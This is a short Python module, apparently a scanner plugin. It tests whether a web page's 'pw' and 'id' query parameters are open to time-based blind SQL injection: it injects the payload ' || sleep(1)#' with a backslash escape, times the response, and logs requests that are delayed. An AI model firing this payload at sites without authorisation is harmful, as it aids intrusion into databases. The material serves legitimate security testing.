from time import time
from json import dumps

from requests import get

from urllib.parse import urlparse, parse_qs


def go(k):
    result = []

    o = urlparse(k['url'])
    query = parse_qs(o.query)
    url = o._replace(query=None).geturl()
    if 'pw' in query:
        query['pw'] = ' || sleep(1)#'
        query['id'] = '\\'
        a1 = time()
        r = get(url, params=query)
        a2 = time()
        # TODO serialize request headers
        if a2 - a1 >= 1:
            tmp = {}
            tmp['url'] = r.request.url
            # tmp['headers'] = r.request.headers.__str__
            tmp['body'] = r.request.body
            result.append(dumps(tmp))

    if len(result) >= 1:
        return result
    else:
        return []
